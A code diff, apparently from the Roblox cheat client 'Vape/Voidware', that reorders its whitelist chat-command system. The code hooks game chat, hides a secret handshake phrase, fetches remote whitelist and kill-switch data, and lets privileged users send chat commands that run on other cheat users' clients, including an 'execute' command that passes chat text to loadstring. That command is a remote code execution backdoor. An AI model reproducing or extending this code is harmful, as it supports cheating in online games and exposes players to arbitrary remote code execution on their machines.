@@ -412,219 +412,7 @@ run(function()
 		end
 	end
 
-
-	function whitelist:checkmessage(msg, plr)
-		local otherprio = self:get(plr)
-		if plr == lplr and msg == 'helloimusinginhaler' then return true end
-		if self.localprio > 0 and self.said[plr.Name] == nil and msg == 'helloimusinginhaler' and plr ~= lplr then
-			self.said[plr.Name] = true
-			warningNotification('Vape', plr.Name..' is using vape!', 60)
-			self.customtags[plr.Name] = {{text = 'VAPE USER', color = Color3.new(1, 1, 0)}}
-			pcall(function()
-				local newent = entityLibrary.getEntity(plr)
-				if newent then entityLibrary.Events.EntityUpdated:Fire(newent) end
-			end)
-			pcall(function()
-				entityLibrary.fullEntityRefresh()
-			end)
-			return true
-		end
-		if self.localprio < otherprio or plr == lplr then
-			local args = msg:split(' ')
-			table.remove(args, 1)
-			local all = false
-			if self:getplayer(args[1]) or args[1] == "all" then
-				if args[1] == "all" then all = true end
-				table.remove(args, 1)
-				for i,v in self.commands do
-					if msg:len() >= (i:len() + 1) and msg:sub(1, i:len() + 1):lower() == ";"..i:lower() then
-						if all then
-							for i2,v2 in pairs(game:GetService("Players"):GetPlayers()) do
-								if v2 ~= game:GetService("Players").LocalPlayer then
-									if tostring(i) == "execute" then
-										if otherprio > 1 then
-											v(v2, args)
-										end
-									else
-										v(v2, args)
-									end
-								end
-							end
-						else
-							v(plr, args)
-						end
-						return true
-					end
-				end
-			end
-		end
-		return false
-	end
-
-	function whitelist:newchat(obj, plr, skip)
-		obj.Text = self:tag(plr, true, true)..obj.Text
-		local sub = obj.ContentText:find(': ')
-		if sub then
-			if not skip and self:checkmessage(obj.ContentText:sub(sub + 3, #obj.ContentText), plr) then
-				obj.Visible = false
-			end
-		end
-	end
-
-	function whitelist:oldchat(func)
-		if not shared.ChatFixer then
-			pcall(function()
-				local msgtable = debug.getupvalue(func, 3)
-				if typeof(msgtable) == 'table' and msgtable.CurrentChannel then
-					self.oldchattable = msgtable
-				end
-				local oldchat
-		
-				oldchat = hookfunction(func, function(data, ...)
-					local plr = playersService:GetPlayerByUserId(data.SpeakerUserId)
-					if plr then
-						data.ExtraData.Tags = data.ExtraData.Tags or {}
-						for i, v in self:tag(plr) do
-							table.insert(data.ExtraData.Tags, {TagText = v.text, TagColor = v.color})
-						end
-						if data.Message and self:checkmessage(data.Message, plr) then data.Message = '' end
-					end
-					return oldchat(data, ...)
-				end)
-				table.insert(vapeConnections, {Disconnect = function() hookfunction(func, oldchat) end})
-			end)
-		end
-	end
-
-	function whitelist:hook()
-		pcall(function()
-			if self.hooked then return end
-			self.hooked = true
-			local exp = coreGui:FindFirstChild('ExperienceChat')
-			if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-				if exp then
-					if exp:WaitForChild('appLayout', 5) then
-						table.insert(vapeConnections, exp:FindFirstChild('RCTScrollContentView', true).ChildAdded:Connect(function(obj)
-							local plr = playersService:GetPlayerByUserId(tonumber(obj.Name:split('-')[1]) or 0)
-							obj = obj:FindFirstChild('TextMessage', true)
-							if obj then
-								if plr then
-									self:newchat(obj, plr, true)
-									obj:GetPropertyChangedSignal('Text'):Wait()
-									self:newchat(obj, plr)
-								end
-								if obj.ContentText:sub(1, 35) == 'You are now privately chatting with' then
-									obj.Visible = false
-								end
-							end
-						end))
-					end
-				end
-			elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
-				pcall(function()
-					for i, v in getconnections(replicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent) do
-						if v.Function and table.find(debug.getconstants(v.Function), 'UpdateMessagePostedInChannel') then
-							self:oldchat(v.Function)
-							break
-						end
-					end
-					for i, v in getconnections(replicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent) do
-						if v.Function and table.find(debug.getconstants(v.Function), 'UpdateMessageFiltered') then
-							self:oldchat(v.Function)
-							break
-						end
-					end
-				end)
-			end
-			if exp then
-				local bubblechat = exp:WaitForChild('bubbleChat', 5)
-				if bubblechat then
-					table.insert(vapeConnections, bubblechat.DescendantAdded:Connect(function(newbubble)
-						if newbubble:IsA('TextLabel') and newbubble.Text:find('helloimusinginhaler') then
-							newbubble.Parent.Parent.Visible = false
-						end
-					end))
-				end
-			end
-		end)
-	end
-
-	function whitelist:check(first)
-		self.vapetextdata = game:GetService("HttpService"):JSONEncode({WhitelistedUsers = {}})
-		local whitelistloaded, err = pcall(function()
-			self.textdata = game:HttpGet('https://whitelist.vapevoidware.xyz', true)
-		end)
-		local suc, res = pcall(function()
-			local _, subbed = pcall(function()
-				return game:HttpGet('https://github.com/7GrandDadPGN/whitelists')
-			end)
-			local commit = subbed:find('currentOid')
-			commit = commit and subbed:sub(commit + 13, commit + 52) or nil
-			commit = commit and #commit == 40 and commit or 'main'
-			self.vapetextdata = game:HttpGet('https://raw.githubusercontent.com/7GrandDadPGN/whitelists/'..commit..'/PlayerWhitelist.json', true)
-		end)
-		if not whitelistloaded or not sha or not self.get then return true end
-		self.loaded = true
-		if not first or self.textdata ~= self.olddata then -- Just because voidware wont auto update on new vape whitelist change on the repeated :check function doesn't mean your whitelist won't work xylex
-			if not first then
-				self.olddata = isfile('vape/profiles/whitelist.json') and readfile('vape/profiles/whitelist.json') or nil
-			end
-			self.data = game:GetService('HttpService'):JSONDecode(self.textdata)
-			if suc then
-				self.vapedata = game:GetService("HttpService"):JSONDecode(self.vapetextdata)
-				if self.vapedata ~= nil and type(self.vapedata) == 'table' then
-					for i,v in pairs(self.vapedata.WhitelistedUsers) do
-						if v ~= nil and type(v) == 'table' then v.VapeWL = true end
-						whitelist.data.WhitelistedUsers[i] = v
-					end
-				end
-			end
-			self.localprio = self:get(lplr)
-
-			for i, v in self.data.WhitelistedUsers do
-				if v.hidetag then v.tags = nil end
-				if v.tags then
-					for i2, v2 in v.tags do
-						v2.color = Color3.fromRGB(unpack(v2.color))
-					end
-				end
-			end
-
-			for i, v in playersService:GetPlayers() do self:playeradded(v) end
-			if not self.connection then
-				self.connection = playersService.PlayerAdded:Connect(function(v) self:playeradded(v, true) end)
-			end
-			if (entityLibrary.isAlive or #entityLibrary.entityList > 0) then
-				entityLibrary.fullEntityRefresh()
-			end
-
-			if self.textdata ~= self.olddata then
-				if self.data.Announcement.expiretime > os.time() then
-					local targets = self.data.Announcement.targets == 'all' and {tostring(lplr.UserId)} or targets:split(',')
-					if table.find(targets, tostring(lplr.UserId)) then
-						local hint = Instance.new('Hint')
-						hint.Text = 'VAPE ANNOUNCEMENT: '..self.data.Announcement.text
-						hint.Parent = game.Workspace
-						game:GetService('Debris'):AddItem(hint, 20)
-					end
-				end
-				self.olddata = self.textdata
-				pcall(function() writefile('vape/profiles/whitelist.json', self.textdata) end)
-			end
-
-			if self.data.KillVape then
-				GuiLibrary.SelfDestruct()
-				return true
-			end
-
-			if self.data.BlacklistedUsers[tostring(lplr.UserId)] then
-				task.spawn(lplr.kick, lplr, self.data.BlacklistedUsers[tostring(lplr.UserId)])
-				return true
-			end
-		end
-	end
-
-	whitelist.commands = {
+	local commands = {
 		byfron = function()
 			task.spawn(function()
 				if setthreadcaps then setthreadcaps(8) end
@@ -1177,8 +965,9 @@ run(function()
 			pcall(function() loadstring(table.concat(args, ' '))() end)
 		end
 	}
+
 	pcall(function()
-		whitelist.commands["cmds"] = function()
+		commands["cmds"] = function()
 			local function show(text)
 				game:GetService('StarterGui'):SetCore(
 					'ChatMakeSystemMessage', 
@@ -1190,11 +979,12 @@ run(function()
 					}
 				)
 			end
-			for i,v in pairs(whitelist.commands) do
+			for i,v in pairs(commands) do
 				if tostring(i) ~= "cmds" then show(";"..tostring(i)) end
 			end
 		end
 	end)
+
 	local bedwars_gameIds = {6872265039, 6872274481, 8444591321, 8560631822}
 	local function isBedwars()
 		local a = game.PlaceId
@@ -1202,7 +992,7 @@ run(function()
 		return false
 	end
 	if isBedwars() then 
-		whitelist.commands["cteleport"] = function(sender, args)
+		commands["cteleport"] = function(sender, args)
 			if #args < 1 then return end
 			local args2 = {
 				[1] = game:GetService("HttpService"):GenerateGUID(),
@@ -1213,6 +1003,219 @@ run(function()
 			local res = game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("CustomMatches/JoinByCode"):FireServer(unpack(args2))
 		end 
 	end
+
+	function whitelist:checkmessage(msg, plr)
+		local otherprio = self:get(plr)
+		if plr == lplr and msg == 'helloimusinginhaler' then return true end
+		if self.localprio > 0 and self.said[plr.Name] == nil and msg == 'helloimusinginhaler' and plr ~= lplr then
+			self.said[plr.Name] = true
+			warningNotification('Vape', plr.Name..' is using vape!', 60)
+			self.customtags[plr.Name] = {{text = 'VAPE USER', color = Color3.new(1, 1, 0)}}
+			pcall(function()
+				local newent = entityLibrary.getEntity(plr)
+				if newent then entityLibrary.Events.EntityUpdated:Fire(newent) end
+			end)
+			pcall(function()
+				entityLibrary.fullEntityRefresh()
+			end)
+			return true
+		end
+		if self.localprio < otherprio or plr == lplr then
+			local args = msg:split(' ')
+			table.remove(args, 1)
+			local all = false
+			if self:getplayer(args[1]) or args[1] == "all" then
+				if args[1] == "all" then all = true end
+				table.remove(args, 1)
+				for i,v in commands do
+					if msg:len() >= (i:len() + 1) and msg:sub(1, i:len() + 1):lower() == ";"..i:lower() then
+						if all then
+							for i2,v2 in pairs(game:GetService("Players"):GetPlayers()) do
+								if v2 ~= game:GetService("Players").LocalPlayer then
+									if tostring(i) == "execute" then
+										if otherprio > 1 then
+											v(v2, args)
+										end
+									else
+										v(v2, args)
+									end
+								end
+							end
+						else
+							v(plr, args)
+						end
+						return true
+					end
+				end
+			end
+		end
+		return false
+	end
+
+	function whitelist:newchat(obj, plr, skip)
+		obj.Text = self:tag(plr, true, true)..obj.Text
+		local sub = obj.ContentText:find(': ')
+		if sub then
+			if not skip and self:checkmessage(obj.ContentText:sub(sub + 3, #obj.ContentText), plr) then
+				obj.Visible = false
+			end
+		end
+	end
+
+	function whitelist:oldchat(func)
+		if not shared.ChatFixer then
+			pcall(function()
+				local msgtable = debug.getupvalue(func, 3)
+				if typeof(msgtable) == 'table' and msgtable.CurrentChannel then
+					self.oldchattable = msgtable
+				end
+				local oldchat
+		
+				oldchat = hookfunction(func, function(data, ...)
+					local plr = playersService:GetPlayerByUserId(data.SpeakerUserId)
+					if plr then
+						data.ExtraData.Tags = data.ExtraData.Tags or {}
+						for i, v in self:tag(plr) do
+							table.insert(data.ExtraData.Tags, {TagText = v.text, TagColor = v.color})
+						end
+						if data.Message and self:checkmessage(data.Message, plr) then data.Message = '' end
+					end
+					return oldchat(data, ...)
+				end)
+				table.insert(vapeConnections, {Disconnect = function() hookfunction(func, oldchat) end})
+			end)
+		end
+	end
+
+	function whitelist:hook()
+		pcall(function()
+			if self.hooked then return end
+			self.hooked = true
+			local exp = coreGui:FindFirstChild('ExperienceChat')
+			if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+				if exp then
+					if exp:WaitForChild('appLayout', 5) then
+						table.insert(vapeConnections, exp:FindFirstChild('RCTScrollContentView', true).ChildAdded:Connect(function(obj)
+							local plr = playersService:GetPlayerByUserId(tonumber(obj.Name:split('-')[1]) or 0)
+							obj = obj:FindFirstChild('TextMessage', true)
+							if obj then
+								if plr then
+									self:newchat(obj, plr, true)
+									obj:GetPropertyChangedSignal('Text'):Wait()
+									self:newchat(obj, plr)
+								end
+								if obj.ContentText:sub(1, 35) == 'You are now privately chatting with' then
+									obj.Visible = false
+								end
+							end
+						end))
+					end
+				end
+			elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
+				pcall(function()
+					for i, v in getconnections(replicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent) do
+						if v.Function and table.find(debug.getconstants(v.Function), 'UpdateMessagePostedInChannel') then
+							self:oldchat(v.Function)
+							break
+						end
+					end
+					for i, v in getconnections(replicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent) do
+						if v.Function and table.find(debug.getconstants(v.Function), 'UpdateMessageFiltered') then
+							self:oldchat(v.Function)
+							break
+						end
+					end
+				end)
+			end
+			if exp then
+				local bubblechat = exp:WaitForChild('bubbleChat', 5)
+				if bubblechat then
+					table.insert(vapeConnections, bubblechat.DescendantAdded:Connect(function(newbubble)
+						if newbubble:IsA('TextLabel') and newbubble.Text:find('helloimusinginhaler') then
+							newbubble.Parent.Parent.Visible = false
+						end
+					end))
+				end
+			end
+		end)
+	end
+
+	function whitelist:check(first)
+		self.vapetextdata = game:GetService("HttpService"):JSONEncode({WhitelistedUsers = {}})
+		local whitelistloaded, err = pcall(function()
+			self.textdata = game:HttpGet('https://whitelist.vapevoidware.xyz', true)
+		end)
+		local suc, res = pcall(function()
+			local _, subbed = pcall(function()
+				return game:HttpGet('https://github.com/7GrandDadPGN/whitelists')
+			end)
+			local commit = subbed:find('currentOid')
+			commit = commit and subbed:sub(commit + 13, commit + 52) or nil
+			commit = commit and #commit == 40 and commit or 'main'
+			self.vapetextdata = game:HttpGet('https://raw.githubusercontent.com/7GrandDadPGN/whitelists/'..commit..'/PlayerWhitelist.json', true)
+		end)
+		if not whitelistloaded or not sha or not self.get then return true end
+		self.loaded = true
+		if not first or self.textdata ~= self.olddata then -- Just because voidware wont auto update on new vape whitelist change on the repeated :check function doesn't mean your whitelist won't work xylex
+			if not first then
+				self.olddata = isfile('vape/profiles/whitelist.json') and readfile('vape/profiles/whitelist.json') or nil
+			end
+			self.data = game:GetService('HttpService'):JSONDecode(self.textdata)
+			if suc then
+				self.vapedata = game:GetService("HttpService"):JSONDecode(self.vapetextdata)
+				if self.vapedata ~= nil and type(self.vapedata) == 'table' then
+					for i,v in pairs(self.vapedata.WhitelistedUsers) do
+						if v ~= nil and type(v) == 'table' then v.VapeWL = true end
+						whitelist.data.WhitelistedUsers[i] = v
+					end
+				end
+			end
+			self.localprio = self:get(lplr)
+
+			for i, v in self.data.WhitelistedUsers do
+				if v.hidetag then v.tags = nil end
+				if v.tags then
+					for i2, v2 in v.tags do
+						v2.color = Color3.fromRGB(unpack(v2.color))
+					end
+				end
+			end
+
+			for i, v in playersService:GetPlayers() do self:playeradded(v) end
+			if not self.connection then
+				self.connection = playersService.PlayerAdded:Connect(function(v) self:playeradded(v, true) end)
+			end
+			if (entityLibrary.isAlive or #entityLibrary.entityList > 0) then
+				entityLibrary.fullEntityRefresh()
+			end
+
+			if self.textdata ~= self.olddata then
+				if self.data.Announcement.expiretime > os.time() then
+					local targets = self.data.Announcement.targets == 'all' and {tostring(lplr.UserId)} or targets:split(',')
+					if table.find(targets, tostring(lplr.UserId)) then
+						local hint = Instance.new('Hint')
+						hint.Text = 'VAPE ANNOUNCEMENT: '..self.data.Announcement.text
+						hint.Parent = game.Workspace
+						game:GetService('Debris'):AddItem(hint, 20)
+					end
+				end
+				self.olddata = self.textdata
+				pcall(function() writefile('vape/profiles/whitelist.json', self.textdata) end)
+			end
+
+			if self.data.KillVape then
+				GuiLibrary.SelfDestruct()
+				return true
+			end
+
+			if self.data.BlacklistedUsers[tostring(lplr.UserId)] then
+				task.spawn(lplr.kick, lplr, self.data.BlacklistedUsers[tostring(lplr.UserId)])
+				return true
+			end
+		end
+	end
+
+	whitelist.commands = table.clone(commands)
 
 	task.spawn(function()
 		repeat
